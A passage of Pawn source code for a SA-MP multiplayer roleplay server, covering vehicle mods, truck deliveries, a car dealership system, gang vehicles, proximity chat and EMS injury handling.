			 ChangeVehiclePaintjob(PlayerVehicleInfo[playerid][playervehicleid][pvId], paintjob);
			 ChangeVehicleColor(PlayerVehicleInfo[playerid][playervehicleid][pvId], color1, color2);
		}
		for(new m = 0; m < MAX_MODS; m++)
		{
		    if(PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] >= 1000  && PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] <= 1193)
		    {
				if(InvalidModCheck(GetVehicleModel(PlayerVehicleInfo[playerid][playervehicleid][pvId]),PlayerVehicleInfo[playerid][playervehicleid][pvMods][m]))
				{
					AddVehicleComponent(PlayerVehicleInfo[playerid][playervehicleid][pvId], PlayerVehicleInfo[playerid][playervehicleid][pvMods][m]);
				}
				else
				{
				    //printf("Removing invalid mod %d from %d of %s", PlayerVehicleInfo[playerid][playervehicleid][pvMods][m], GetVehicleModel(PlayerVehicleInfo[playerid][playervehicleid][pvId]), GetPlayerNameEx(playerid));
				    PlayerVehicleInfo[playerid][playervehicleid][pvMods][m] = 0;
				}
			}
		}
	}
}

stock GetPlayerFreeVehicleId(playerid) {
	for(new i; i < MAX_PLAYERVEHICLES; ++i) {
		if(PlayerVehicleInfo[playerid][i][pvModelId] == 0) return i;
	}
	return -1;
}

GetPlayerVehicleCount(playerid)
{
	new cars = 0;
	for(new i = 0; i < MAX_PLAYERVEHICLES; i++) {
	    if(PlayerVehicleInfo[playerid][i][pvRealID] > 0) {
	        if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID && PlayerVehicleInfo[playerid][i][pvImpounded] == 0) {
				if(CheckPlayerVehicleForDesync(playerid, PlayerVehicleInfo[playerid][i][pvId])) return 0;
				cars++;
			}
	    }
	}
	return cars;
}

stock GetPlayerVehicleCountEx(playerid)
{
	new cars;
	for(new i = 0; i < MAX_PLAYERVEHICLES; i++) {
	    if(PlayerVehicleInfo[playerid][i][pvRealID] > 0) cars++;
	}
	return cars;
}

CheckPlayerVehicleForDesync(playerid, vehicleid)
{
	if(GetVehicleModel(vehicleid) < 400 || GetVehicleModel(vehicleid) > 611)
	{
	    //SendClientMessage(playerid, COLOR_WHITE, "A problem with your vehicles has been detected.");
	    UnloadPlayerVehicles(playerid);
	    LoadPlayerVehicles(playerid);
	    //SendClientMessage(playerid, COLOR_WHITE, "This problem has now been resolved.");
	    return 1;
	}
	return 0;
}

stock GetPlayerVehicle(playerid, vehicleid)
{
	if(!IsPlayerConnected(playerid)) return -1;
	if(!GetVehicleModel(vehicleid)) return -1;
    for(new v = 0; v < MAX_PLAYERVEHICLES; v++)
    {
        if(PlayerVehicleInfo[playerid][v][pvId] == vehicleid)
        {
            return v;
        }
    }
    return -1;
}

forward IsAtTruckDeliveryPoint(playerid);
public IsAtTruckDeliveryPoint(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 6, 812.287231, -1623.678222, 13.546875) || IsPlayerInRangeOfPoint(playerid, 6, 1204.510375, -920.674499, 43.074016) ||
	IsPlayerInRangeOfPoint(playerid, 6, 2402.169677, -1502.789306, 23.834865) || IsPlayerInRangeOfPoint(playerid, 6, 2110.254394, -1214.892578, 23.485479) ||
	IsPlayerInRangeOfPoint(playerid, 6, 1458.425292, -1140.346069, 23.938444) || IsPlayerInRangeOfPoint(playerid, 6, 500.889678, -1352.339843, 15.463395) ||
	IsPlayerInRangeOfPoint(playerid, 6, 334.012207, -1373.775146, 14.230167) || IsPlayerInRangeOfPoint(playerid, 6, 1317.785522, -870.413818, 39.089378) ||
	IsPlayerInRangeOfPoint(playerid, 6, 1342.577026, -1748.498535, 12.934987) || IsPlayerInRangeOfPoint(playerid, 6, 653.629699, -579.503051, 15.889705) ||
	IsPlayerInRangeOfPoint(playerid, 6, 1634.834716, 757.830017, 10.820312) || IsPlayerInRangeOfPoint(playerid, 6, 2833.109375, 893.754699, 10.757797) ||
	IsPlayerInRangeOfPoint(playerid, 6, -510.522918, -501.250030, 25.523437))
	{ return true; }
	return false;
}

forward CancelTruckDelivery(playerid);
public CancelTruckDelivery(playerid)
{
    new vehicleid = GetPlayerVehicleID(playerid);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(IsATruckerCar(vehicleid)) SetVehicleToRespawn(vehicleid);
	}
 	DestroyProgressBar(LoadTruckBar[playerid]);
	LoadTruckBar[playerid] = INVALID_BAR_ID;
	LoadTruckTime[playerid] = 0;
	DeletePVar(playerid, "TruckDeliver");
	TruckContents[TruckUsed[playerid]] = 0;
	TruckUsed[playerid] = INVALID_VEHICLE_ID;
	gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 	DisablePlayerCheckpoint(playerid);
	return 1;
}

stock InvalidModCheck(model, partid) {
    switch(model) {
		case 430, 446, 452, 453, 454, 472, 473, 484, 493, 595, 573, 556, 557, 539, 471, 432, 406, 444,
		448, 461, 462, 463, 468, 481, 509, 510, 521, 522, 581, 586, 417, 425, 447, 460, 469, 476, 487,
		488, 511, 512, 513, 519, 520, 548, 553, 563, 577, 592, 593: return 0;
		default: switch(GetVehicleComponentType(partid)) {
			case 5: switch(partid) {
				case 1008, 1009, 1010: return 1;
				default: return 0;
			}
			case 7: switch(partid) {
				case 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1096, 1097, 1098, 1025: return 1;
				default: return 0;
			}
			case 8: switch(partid) {
				case 1086: return 1;
				default: return 0;
			}
			case 9: switch(partid) {
				case 1087: return 1;
				default: return 0;
			}
			default: for(new i; i < 4; i++) if(partid == vehicleMods[model - 400][GetVehicleComponentType(partid)][i]) {
				return 1;
			}
		}
	}
	return 0;
}

//------------------------------------------------------------------------------
//CAR DEALERSHIP SYSTEM
//------------------------------------------------------------------------------

stock CreateCarDealership(Float: enx, Float: eny, Float: enz, Float: radius, price, message[])
{
	new dealershipid = GetFreeCarDealership();
	if(dealershipid == -1) return -1;
	new text_info[128];
	CarDealershipInfo[dealershipid][cdEntranceX] = enx;
	CarDealershipInfo[dealershipid][cdEntranceY] = eny;
	CarDealershipInfo[dealershipid][cdEntranceZ] = enz;
	CarDealershipInfo[dealershipid][cdRadius] = radius;
	CarDealershipInfo[dealershipid][cdPrice] = price;
	strmid(CarDealershipInfo[dealershipid][cdMessage], message, 0, strlen(message), 255);
	CarDealershipInfo[dealershipid][cdPickupID] = CreatePickup(1272, 1, CarDealershipInfo[dealershipid][cdEntranceX], CarDealershipInfo[dealershipid][cdEntranceY], CarDealershipInfo[dealershipid][cdEntranceZ], -1);
	format(text_info, sizeof(text_info), "Car Dealership %s For Sale\nPrice: %d\nID: %d", CarDealershipInfo[dealershipid][cdMessage], CarDealershipInfo[dealershipid][cdPrice], dealershipid);
    CarDealershipInfo[dealershipid][cdTextLabel] = CreateDynamic3DTextLabel(text_info,COLOR_YELLOW,CarDealershipInfo[dealershipid][cdEntranceX], CarDealershipInfo[dealershipid][cdEntranceY], CarDealershipInfo[dealershipid][cdEntranceZ]+0.5,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
    SavecDealerships();
    return dealershipid;
}
stock DestroyCarDealership(dealershipid)
{
	new string[30];
	CarDealershipInfo[dealershipid][cdEntranceX] = 0.0;
	CarDealershipInfo[dealershipid][cdEntranceY] = 0.0;
	CarDealershipInfo[dealershipid][cdEntranceZ] = 0.0;
	CarDealershipInfo[dealershipid][cdRadius] = 0.0;
	CarDealershipInfo[dealershipid][cdTill] = 0;
	CarDealershipInfo[dealershipid][cdOwned] = 0;
	CarDealershipInfo[dealershipid][cdPrice] = 0;
	format(string, sizeof(string), "None");
	strmid(CarDealershipInfo[dealershipid][cdOwner], string, 0, strlen(string), 255);
	format(string, sizeof(string), "None");
	strmid(CarDealershipInfo[dealershipid][cdMessage], string, 0, strlen(string), 255);
	DestroyDynamic3DTextLabel(CarDealershipInfo[dealershipid][cdTextLabel]);
	DestroyPickup(CarDealershipInfo[dealershipid][cdPickupID]);
	CarDealershipInfo[dealershipid][cdPickupID] = 0;
	CarDealershipInfo[dealershipid][cdTextLabel] = Text3D:INVALID_3DTEXT_ID;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][0] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawn][1] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawn][2] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawn][3] = 0.0;
	for(new v = 0; v < MAX_DEALERSHIPVEHICLES; v++)
	{
		if(CarDealershipInfo[dealershipid][cdVehicleModel][v] != 0)
		{
	        DestroyCarDealershipVehicle(dealershipid, v);
		}
	}
	SavecDealerships();
}
stock GetFreeCarDealership()
{
    new
		i = 0;
	while (i < MAX_CARDEALERSHIPS && CarDealershipInfo[i][cdEntranceX] != 0.0 && CarDealershipInfo[i][cdEntranceY] != 0.0)
	{
		i++;
	}
	if(i == MAX_CARDEALERSHIPS) return -1;
	return i;

}
stock SetPlayerOwnerOfCD(playerid, dealershipid)
{
	new owner[MAX_PLAYER_NAME];
	CarDealershipInfo[dealershipid][cdOwned] = 1;
	GetPlayerName(playerid, owner, sizeof(owner));
	strmid(CarDealershipInfo[dealershipid][cdOwner], owner, 0, strlen(owner), 255);
	new text_info[128];
	format(text_info, sizeof(text_info), "Car Dealership %s\nOwner: %s\nID: %d", CarDealershipInfo[dealershipid][cdMessage], CarDealershipInfo[dealershipid][cdOwner], dealershipid);
	UpdateDynamic3DTextLabelText(CarDealershipInfo[dealershipid][cdTextLabel], COLOR_LIGHTBLUE, text_info);
	SavecDealerships();
}
stock SellCarDealership(dealershipid)
{
	CarDealershipInfo[dealershipid][cdOwned] = 0;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][0] = 0.0;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][1] = 0.0;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][2] = 0.0;
	CarDealershipInfo[dealershipid][cdVehicleSpawn][3] = 0.0;
	strmid(CarDealershipInfo[dealershipid][cdOwner], "No-one", 0, MAX_PLAYER_NAME, 255);
	new text_info[128];
	format(text_info, sizeof(text_info), "Car Dealership %s For Sale\nPrice: %d\nID: %d", CarDealershipInfo[dealershipid][cdMessage], CarDealershipInfo[dealershipid][cdPrice], dealershipid);
	UpdateDynamic3DTextLabelText(CarDealershipInfo[dealershipid][cdTextLabel], COLOR_RED, text_info);
	SavecDealerships();
}
stock IsPlayerOwnerOfCD(playerid)
{
	new owner[MAX_PLAYER_NAME];
	GetPlayerName(playerid, owner, sizeof(owner));
	for(new d = 0; d < MAX_CARDEALERSHIPS; d++)
    {
	    if(strcmp(CarDealershipInfo[d][cdOwner],owner, true) == 0)
	    {
			return d;
		}
	}
	return -1;
}
stock IsPlayerOwnerOfCDEx(playerid, dealershipid)
{
	new owner[MAX_PLAYER_NAME];
	GetPlayerName(playerid, owner, sizeof(owner));
	if(strcmp(CarDealershipInfo[dealershipid][cdOwner],owner, true) == 0)
	{
	    return 1;
	}
	return 0;
}
stock CreateCarDealershipVehicle(dealershipid, modelid, Float: x, Float: y, Float: z, Float: a, price)
{
    new cdvehicleid = GetFreeCarDealershipVehicleId(dealershipid);
    if(cdvehicleid == -1) return -1;
    new text_info[128];
    CarDealershipInfo[dealershipid][cdVehicleModel][cdvehicleid] = modelid;
    CarDealershipInfo[dealershipid][cdVehicleCost][cdvehicleid] = price;
    CarDealershipInfo[dealershipid][cdVehicleSpawnX][cdvehicleid] = x;
    CarDealershipInfo[dealershipid][cdVehicleSpawnY][cdvehicleid] = y;
    CarDealershipInfo[dealershipid][cdVehicleSpawnZ][cdvehicleid] = z;
    CarDealershipInfo[dealershipid][cdVehicleSpawnAngle][cdvehicleid] = a;
    new carcreated = CreateVehicle(modelid, x, y, z, a, 0, 0, 6);
    format(text_info, sizeof(text_info), "%s For Sale | Price: %d", GetVehicleName(carcreated), CarDealershipInfo[dealershipid][cdVehicleCost][cdvehicleid]);
    CarDealershipInfo[dealershipid][cdVehicleLabel][cdvehicleid] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,0.0, 0.0, 0.0,5.0,INVALID_PLAYER_ID,carcreated,1);
	CarDealershipInfo[dealershipid][cdVehicleId][cdvehicleid] = carcreated;
	SavecDealerships();
    return cdvehicleid;
}
stock DestroyCarDealershipVehicle(dealershipid, cdvehicleid)
{
    CarDealershipInfo[dealershipid][cdVehicleModel][cdvehicleid] = 0;
    CarDealershipInfo[dealershipid][cdVehicleCost][cdvehicleid] = 0;
    CarDealershipInfo[dealershipid][cdVehicleSpawnX][cdvehicleid] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawnY][cdvehicleid] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawnZ][cdvehicleid] = 0.0;
    CarDealershipInfo[dealershipid][cdVehicleSpawnAngle][cdvehicleid] = 0.0;
    DestroyDynamic3DTextLabel(CarDealershipInfo[dealershipid][cdVehicleLabel][cdvehicleid]);
    DestroyVehicle(CarDealershipInfo[dealershipid][cdVehicleId][cdvehicleid]);
    VehicleRadioStation[CarDealershipInfo[dealershipid][cdVehicleId][cdvehicleid]] = 0;
    CarDealershipInfo[dealershipid][cdVehicleLabel][cdvehicleid] = Text3D:INVALID_3DTEXT_ID;
    CarDealershipInfo[dealershipid][cdVehicleId][cdvehicleid] = 0;
}
stock GetFreeCarDealershipVehicleId(dealershipid)
{
    new
		i = 0;
	while (i < MAX_DEALERSHIPVEHICLES && CarDealershipInfo[dealershipid][cdVehicleModel][i] != 0)
	{
		i++;
	}
	if(i == MAX_DEALERSHIPVEHICLES) return -1;
	return i;

}
stock GetCarDealershipVehicleId(vehicleid)
{
    for(new d = 0; d < MAX_CARDEALERSHIPS; d++)
    {
        for(new v = 0; v < MAX_DEALERSHIPVEHICLES; v++)
        {
            if(CarDealershipInfo[d][cdVehicleId][v] == vehicleid)
            {
                return v;
            }
		}
    }
    return -1;
}
stock GetCarDealershipId(vehicleid)
{
    for(new d = 0; d < MAX_CARDEALERSHIPS; d++)
    {
        for(new v = 0; v < MAX_DEALERSHIPVEHICLES; v++)
        {
            if(CarDealershipInfo[d][cdVehicleId][v] == vehicleid)
            {
                return d;
            }
		}
    }
    return -1;
}

//------------------------------------------------------------------------------
//----------------------DYNAMIC GANG VEHICLE SYSTEM-----------------------------
//------------------------------------------------------------------------------

LockGangVehicle(family, carid, type)
{
	new v = GetGangVehicle(family, carid);
	if(FamilyVehicleInfo[family][v][fvId] == carid && type == 2)
	{
	    LockStatus[carid] = 1;
		vehicle_lock_doors(carid);
	}
}

UnLockGangVehicle(family, carid, type)
{
	new v = GetGangVehicle(family, carid);
	if(FamilyVehicleInfo[family][v][fvId] == carid && type == 2)
	{
	    LockStatus[carid] = 0;
		vehicle_unlock_doors(carid);
	}
}

stock CreateGangVehicle(f, fv, modelid, Float: x, Float: y, Float: z, Float: angle, color1, color2, price)
{
	if(FamilyVehicleInfo[f][fv][fvId] == INVALID_VEHICLE_ID)
	{
		FamilyVehicleInfo[f][fv][fvModelId] = modelid;
		FamilyVehicleInfo[f][fv][fvSpawnx] = x;
		FamilyVehicleInfo[f][fv][fvSpawny] = y;
		FamilyVehicleInfo[f][fv][fvSpawnz] = z;
		FamilyVehicleInfo[f][fv][fvSpawna] = angle;
		FamilyVehicleInfo[f][fv][fvColor1] = color1;
		FamilyVehicleInfo[f][fv][fvColor2] = color2;
		FamilyVehicleInfo[f][fv][fvPrice] = price;
		FamilyVehicleInfo[f][fv][fvFuel] = 100.0;
		new carcreated = CreateVehicle(modelid,x,y,z,angle,color1,color2,-1);
		LockStatus[carcreated] = 0;
		FamilyVehicleInfo[f][fv][fvId] = carcreated;
		//printf("Created the gang vehicle for family %d | vehicleid #%d | familyvehicleslot #%d.", f, FamilyVehicleInfo[f][fv][fvId], fv);
		return carcreated;
	}
	return INVALID_VEHICLE_ID;
}

stock DestroyGangVehicle(f, fv)
{
	if(FamilyVehicleInfo[f][fv][fvId] != INVALID_VEHICLE_ID)
	{
		DestroyVehicle(FamilyVehicleInfo[f][fv][fvId]);
		VehicleRadioStation[FamilyVehicleInfo[f][fv][fvId]] = 0;
		FamilyVehicleInfo[f][fv][fvModelId] = 0;
		FamilyVehicleInfo[f][fv][fvSpawnx] = 0.0;
		FamilyVehicleInfo[f][fv][fvSpawny] = 0.0;
		FamilyVehicleInfo[f][fv][fvSpawnz] = 0.0;
		FamilyVehicleInfo[f][fv][fvSpawna] = 0.0;
		FamilyVehicleInfo[f][fv][fvPaintJob] = -1;
		FamilyVehicleInfo[f][fv][fvColor1] = 126;
		FamilyVehicleInfo[f][fv][fvColor2] = 126;
		FamilyVehicleInfo[f][fv][fvPrice] = 0;
		FamilyVehicleInfo[f][fv][fvImpounded] = 0;
		FamilyVehicleInfo[f][fv][fvFuel] = 100.0;
		LockStatus[FamilyVehicleInfo[f][fv][fvId]] = 0;
		//VehicleFuel[FamilyVehicleInfo[f][fv][fvId]] = 100.0;
	    //printf("Family %d vehicle %d(vehicleid %d) has been destroyed.", f,fv,FamilyVehicleInfo[f][fv][fvId]);
	    FamilyVehicleInfo[f][fv][fvId] = INVALID_VEHICLE_ID;
	}
}

stock LoadGangVehicles(f)
{
	//printf(" Loading family %d's vehicles.", f);
	for(new fv = 0; fv < MAX_GANG_VEHICLES; fv++)
    {
        if(FamilyVehicleInfo[f][fv][fvModelId] != 0)
        {
			new carcreated = CreateVehicle(FamilyVehicleInfo[f][fv][fvModelId], FamilyVehicleInfo[f][fv][fvSpawnx], FamilyVehicleInfo[f][fv][fvSpawny], FamilyVehicleInfo[f][fv][fvSpawnz], FamilyVehicleInfo[f][fv][fvSpawna],FamilyVehicleInfo[f][fv][fvColor1], FamilyVehicleInfo[f][fv][fvColor2], -1);
			FamilyVehicleInfo[f][fv][fvId] = carcreated;
			//VehicleFuel[carcreated] = FamilyVehicleInfo[f][fv][fvFuel];
			//if(VehicleFuel[carcreated] == 0) VehicleFuel[carcreated] = 100.0;
			if(FamilyVehicleInfo[f][fv][fvLocked] == 1) LockGangVehicle(f, FamilyVehicleInfo[f][fv][fvId], FamilyVehicleInfo[f][fv][fvLock]);
        }
    }
}

stock UnloadGangVehicles(f)
{
	//printf(" Unloading %s's vehicles.", FamilyInfo[f][FamilyName]);
	for(new fv = 0; fv < MAX_PLAYERVEHICLES; fv++)
    {
        if(FamilyVehicleInfo[f][fv][fvId] != INVALID_VEHICLE_ID)
        {
            if(LockStatus[FamilyVehicleInfo[f][fv][fvId]] != 0) LockStatus[FamilyVehicleInfo[f][fv][fvId]] = 0;
			DestroyVehicle(FamilyVehicleInfo[f][fv][fvId]);
			VehicleRadioStation[FamilyVehicleInfo[f][fv][fvId]] = 0;
			//VehicleFuel[FamilyVehicleInfo[f][fv][fvId]] = 100.0;
			FamilyVehicleInfo[f][fv][fvId] = INVALID_VEHICLE_ID;
        }
    }
}

stock UpdateGangVehicleParkPosition(f, fv, Float:newx, Float:newy, Float:newz, Float:newangle, Float:health, temp = 1)
{
	if(FamilyVehicleInfo[f][fv][fvId] != INVALID_VEHICLE_ID)
	{
	    if(temp == 0)
		{
	 		new Float:oldx, Float:oldy, Float:oldz;
			oldx = FamilyVehicleInfo[f][fv][fvSpawnx];
			oldy = FamilyVehicleInfo[f][fv][fvSpawny];
			oldz = FamilyVehicleInfo[f][fv][fvSpawnz];
			if(oldx == newx && oldy == newy && oldz == newz) return 0;
			FamilyVehicleInfo[f][fv][fvSpawnx] = newx;
			FamilyVehicleInfo[f][fv][fvSpawny] = newy;
			FamilyVehicleInfo[f][fv][fvSpawnz] = newz;
			FamilyVehicleInfo[f][fv][fvSpawna] = newangle;
			DestroyVehicle(FamilyVehicleInfo[f][fv][fvId]);
			new carcreated = CreateVehicle(FamilyVehicleInfo[f][fv][fvModelId], FamilyVehicleInfo[f][fv][fvSpawnx], FamilyVehicleInfo[f][fv][fvSpawny], FamilyVehicleInfo[f][fv][fvSpawnz],
			FamilyVehicleInfo[f][fv][fvSpawna],FamilyVehicleInfo[f][fv][fvColor1], FamilyVehicleInfo[f][fv][fvColor2], -1);
	        FamilyVehicleInfo[f][fv][fvId] = carcreated;
	        SetVehicleHealth(carcreated, health);
	        SaveFamiliesHQ();
        	return 1;
		}
		else
		{
		    new Float:oldx, Float:oldy, Float:oldz;
			oldx = FamilyVehicleInfo[f][fv][fvSpawnxtmp];
			oldy = FamilyVehicleInfo[f][fv][fvSpawnytmp];
			oldz = FamilyVehicleInfo[f][fv][fvSpawnztmp];
			if(oldx == newx && oldy == newy && oldz == newz) return 0;
			FamilyVehicleInfo[f][fv][fvSpawnxtmp] = newx;
			FamilyVehicleInfo[f][fv][fvSpawnytmp] = newy;
			FamilyVehicleInfo[f][fv][fvSpawnztmp] = newz;
			FamilyVehicleInfo[f][fv][fvSpawnatmp] = newangle;
			DestroyVehicle(FamilyVehicleInfo[f][fv][fvId]);
			new carcreated = CreateVehicle(FamilyVehicleInfo[f][fv][fvModelId], FamilyVehicleInfo[f][fv][fvSpawnxtmp], FamilyVehicleInfo[f][fv][fvSpawnytmp], FamilyVehicleInfo[f][fv][fvSpawnztmp],
			FamilyVehicleInfo[f][fv][fvSpawnatmp],FamilyVehicleInfo[f][fv][fvColor1], FamilyVehicleInfo[f][fv][fvColor2], -1);
	        FamilyVehicleInfo[f][fv][fvId] = carcreated;
	        SetVehicleHealth(carcreated, health);
	        SaveFamiliesHQ();
        	return 1;
		}
	}
	return 0;
}

stock GetGangFreeVehicleId(f)
{
    new
		i = 0;
	while (i < MAX_GANG_VEHICLES && FamilyVehicleInfo[f][i][fvId] != INVALID_VEHICLE_ID)
	{
		i++;
	}
	if(i == MAX_GANG_VEHICLES) return -1;
	return i;

}

stock GetGangVehicleCount(f)
{
    new
		i = 0,
		cars = 0;
	while (i < MAX_GANG_VEHICLES && FamilyVehicleInfo[f][i][fvId] != INVALID_VEHICLE_ID)
	{
	    cars++;
		i++;
	}
	return cars;

}

stock GetGangVehicle(f, vehicleid)
{
	if(f == 255) return -1;
	if(vehicleid == -1) return -1;
    for(new v = 0; v < MAX_GANG_VEHICLES; v++)
    {
        if(FamilyVehicleInfo[f][v][fvId] == vehicleid)
        {
            return v;
        }
    }
    return -1;
}

ProxDetector(Float: f_Radius, playerid, string[],col1,col2,col3,col4,col5)
{
    new
        Float: f_playerPos[3];

    GetPlayerPos(playerid, f_playerPos[0], f_playerPos[1], f_playerPos[2]);

    foreach(Player, i) {
        if((InsideShamal[playerid] == GetPlayerVehicleID(i) && GetPlayerState(i) == 2) || (InsideShamal[i] == GetPlayerVehicleID(playerid) && GetPlayerState(playerid) == 2) || (InsideShamal[playerid] != INVALID_VEHICLE_ID && InsideShamal[playerid] == InsideShamal[i])) {
            SendClientMessage(i, col1, string);
        }
        else if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid)) {
            if(IsPlayerInRangeOfPoint(i, f_Radius / 16, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col1, string);
            }
            else if(IsPlayerInRangeOfPoint(i, f_Radius / 8, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col2, string);
            }
            else if(IsPlayerInRangeOfPoint(i, f_Radius / 4, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col3, string);
            }
            else if(IsPlayerInRangeOfPoint(i, f_Radius / 2, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col4, string);
            }
            else if(IsPlayerInRangeOfPoint(i, f_Radius, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col5, string);
            }
        }
    }
    return 1;
}

ProxDetectorS(Float:radi, playerid, targetid) {

	if(Spectating[targetid] != 0 && PlayerInfo[playerid][pAdmin] < 2)
 	{
 		return 0;
 	}

	new
		Float: fp_playerPos[3];

	GetPlayerPos(targetid, fp_playerPos[0], fp_playerPos[1], fp_playerPos[2]);

	if(IsPlayerInRangeOfPoint(playerid, radi, fp_playerPos[0], fp_playerPos[1], fp_playerPos[2]) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(targetid))
	{
		return 1;
	}
	return 0;
}

IsPlayerInRangeOfVehicle(playerid, vehicleid, Float: radius) {

	new
		Float:Floats[3];

	GetVehiclePos(vehicleid, Floats[0], Floats[1], Floats[2]);
	return IsPlayerInRangeOfPoint(playerid, radius, Floats[0], Floats[1], Floats[2]);
}

forward MoveEMS(playerid);
public MoveEMS(playerid)
{
    new Float:mX, Float:mY, Float:mZ;
    GetPlayerPos(playerid, mX, mY, mZ);

    SetPVarFloat(GetPVarInt(playerid, "MovingStretcher"), "MedicX", mX);
	SetPVarFloat(GetPVarInt(playerid, "MovingStretcher"), "MedicY", mY);
	SetPVarFloat(GetPVarInt(playerid, "MovingStretcher"), "MedicZ", mZ);
	SetPVarInt(GetPVarInt(playerid, "MovingStretcher"), "MedicVW", GetPlayerVirtualWorld(playerid));
	SetPVarInt(GetPVarInt(playerid, "MovingStretcher"), "MedicInt", GetPlayerInterior(playerid));

	Streamer_UpdateEx(GetPVarInt(playerid, "MovingStretcher"), mX, mY, mZ);
	SetPlayerPos(GetPVarInt(playerid, "MovingStretcher"), mX, mY, mZ);
	SetPlayerInterior(GetPVarInt(playerid, "MovingStretcher"), GetPlayerVirtualWorld(playerid));
	SetPlayerVirtualWorld(GetPVarInt(playerid, "MovingStretcher"), GetPlayerVirtualWorld(playerid));

	ClearAnimations(GetPVarInt(playerid, "MovingStretcher"), 1);
	ApplyAnimation(GetPVarInt(playerid, "MovingStretcher"), "SWAT", "gnstwall_injurd", 4.0, 0, 1, 1, 1, 0, 1);

	DeletePVar(GetPVarInt(playerid, "MovingStretcher"), "OnStretcher");
	SetPVarInt(playerid, "MovingStretcher", -1);
}

forward KillEMSQueue(playerid);
public KillEMSQueue(playerid)
{
	if(IsPlayerConnected(GetPVarInt(playerid, "EMSWaiting")) && EMSAccepted[GetPVarInt(playerid, "EMSWaiting")] == playerid) {
		new
			string[126];
		format(string, sizeof(string), "* Your patient %s has died before you reached them!",GetPlayerNameEx(playerid));
		SendClientMessage(GetPVarInt(playerid, "EMSWaiting"), COLOR_LIGHTBLUE, string);
		DisablePlayerCheckpoint(GetPVarInt(playerid, "EMSWaiting"));
		EMSCallTime[GetPVarInt(playerid, "EMSWaiting")] = 0;
		EMSAccepted[GetPVarInt(playerid, "EMSWaiting")] = INVALID_PLAYER_ID;
	}
    DeletePVar(playerid, "Injured");
    DeletePVar(playerid, "EMSAttempt");
    DeletePVar(playerid, "EMSWaiting");
	SetPVarInt(playerid, "MedicBill", 1);
	DeletePVar(playerid, "MedicCall");

	return 1;
}

forward SendEMSQueue(playerid,type);
public SendEMSQueue(playerid,type)
{
	switch (type)
	{
		case 1:
		{
		    Streamer_UpdateEx(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
			SetPlayerPos(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"MedicVW"));
	  		SetPlayerInterior(playerid, GetPVarInt(playerid,"MedicInt"));

			SetPVarInt(playerid, "EMSAttempt", -1);

			if(GetPlayerInterior(playerid) > 0)
			{
  				LoadObjectsForPlayer(playerid);
			}

			GameTextForPlayer(playerid, "~r~Injured~n~~w~/accept death or /service ems", 5000, 3);
			ClearAnimations(playerid, 1);
			PreloadAnimLib(playerid,"KNIFE");
			ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0, 1);
			SetPlayerHealth(playerid, 100);
			SetPlayerArmourEx(playerid,0);
			if(GetPVarInt(playerid, "usingfirstaid") == 1)
			    firstaidexpire(playerid);

			SetPVarInt(playerid,"MedicCall",1);
		}
		case 2:
		{
		    SetPVarInt(playerid,"EMSAttempt", 2);
			ClearAnimations(playerid, 1);
		 	ApplyAnimation(playerid, "SWAT", "gnstwall_injurd", 4.0, 0, 1, 1, 1, 0, 1);
			SetPlayerHealth(playerid, 100);
			SetPlayerArmourEx(playerid,0);
		}
	}
	return 1;
}

stock AddAutomatedFlag(playerid, reason[]) {
	new month,day,year;
	getdate(year,month,day);
 	if(!strlen(PlayerInfo[playerid][pFlag]))
	 	format(PlayerInfo[playerid][pFlag],128,"%s - Server (%d/%d/%d)",reason, day, month, year);

	return 1;
}

stock AddFlag(playerid,adminid,reason[])
{
	new month,day,year;
	getdate(year,month,day);
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
 	format(PlayerInfo[playerid][pFlag],128,"%s - %s (%d/%d/%d)",reason,GetPlayerNameEx(adminid), day, month, year);
}

forward AddReportToken(playerid);
public AddReportToken(playerid)
{
	new
		sz_FileStr[32 + MAX_PLAYER_NAME],
		sz_playerName[MAX_PLAYER_NAME],
		i_timestamp[3],
		File: fPointer;

	GetPlayerName(playerid, sz_playerName, MAX_PLAYER_NAME);
	getdate(i_timestamp[0], i_timestamp[1], i_timestamp[2]);

	format(sz_FileStr, sizeof(sz_FileStr), "admins/rtokens/%s[%d'%d'%d]", sz_playerName, i_timestamp[1], i_timestamp[2], i_timestamp[0]);
	if(fexist(sz_FileStr))
	{
		fPointer = fopen(sz_FileStr, io_read);
		fread(fPointer, sz_playerName);
		fclose(fPointer);

		new
			i_tokenVal = strval(sz_playerName);

		format(sz_playerName, sizeof(sz_playerName), "%i", i_tokenVal + 1);
		fPointer = fopen(sz_FileStr, io_write);
		fwrite(fPointer, sz_playerName);
		fclose(fPointer);
	}
	else {
		fPointer = fopen(sz_FileStr, io_write);
